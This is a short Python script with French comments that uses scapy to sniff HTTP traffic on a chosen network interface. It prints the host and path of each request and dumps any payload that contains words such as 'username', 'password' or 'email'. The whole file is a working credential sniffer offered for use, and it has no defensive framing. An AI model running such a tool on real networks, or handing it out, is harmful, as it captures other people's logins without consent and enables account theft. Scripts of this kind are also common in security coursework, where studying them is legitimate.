import scapy.all as scapy
import argparse
from scapy.layers import http
import colorama
from colorama import Fore
from scapy.all import sniff


# Fonction pour obtenir l'interface depuis la ligne de commande
def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Spécifiez l'interface réseau")
    arguments = parser.parse_args()
    if not arguments.interface:
        parser.error("Veuillez spécifier l'interface avec l'option -i.")
    return arguments.interface

# Fonction pour afficher les informations de la requête HTTP
# Fonction pour afficher les informations de la requête HTTP
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode('utf-8')
        path = packet[http.HTTPRequest].Path.decode('utf-8')
        print(f"[+] Requête HTTP >> Host: {host}, Chemin: {path}")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            try:
                load_text = load.decode('utf-8')
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load_text:
                        print(Fore.RED + f"[+] Données sensibles détectées: {load_text}" + Fore.RESET)
                        break
            except UnicodeDecodeError:
                print(Fore.RED + f"[+] Données non textuelles détectées" + Fore.RESET)

# ...



# Obtenir l'interface depuis la ligne de commande
iface = get_interface()

# Démarrer la capture de paquets sur l'interface spécifiée
print(f"Capture de paquets sur l'interface {iface} en cours...")
sniff(iface=iface, store=False, prn=process_packet, stop_filter=lambda x: False)